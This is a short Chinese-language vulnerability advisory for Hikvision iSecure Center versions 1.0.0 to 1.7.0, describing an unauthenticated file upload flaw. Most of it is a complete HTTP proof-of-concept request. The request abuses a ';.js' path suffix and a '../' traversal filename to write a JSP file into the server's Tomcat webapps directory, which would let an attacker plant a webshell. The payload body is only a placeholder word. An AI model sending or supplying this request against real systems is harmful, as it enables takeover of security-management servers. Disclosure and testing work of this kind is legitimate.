#### 影响范围

iSecure Center V1.0.0 - V1.7.0

#### 漏洞概述

海康威视股份有限公司是⼀家专业从事视频监控产品的研发、⽣产和销售的 ⾼科技企业。 海康威视iSecure Center综合安防管理平台软件存在⽂件上传漏洞，未经授权的攻击者可以上传恶意Webshell ⽂件从⽽控制服务器

#### 漏洞复现

漏洞POC：

```
POST /center/api/files;.js HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Trailer/99.3.7322.23
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: ISMS_8700_Sessionname=9FA2A7863677C005343E941A7DBAB259
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOKldnDPT
Upgrade-Insecure-Requests: 1
Content-Length: 241
Connection: close

------WebKitFormBoundaryOKldnDPT
Content-Disposition: form-data; name="file"; filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/h2.jsp" 
Content-Type: application/octet-stream

shell
------WebKitFormBoundaryOKldnDPT--
```



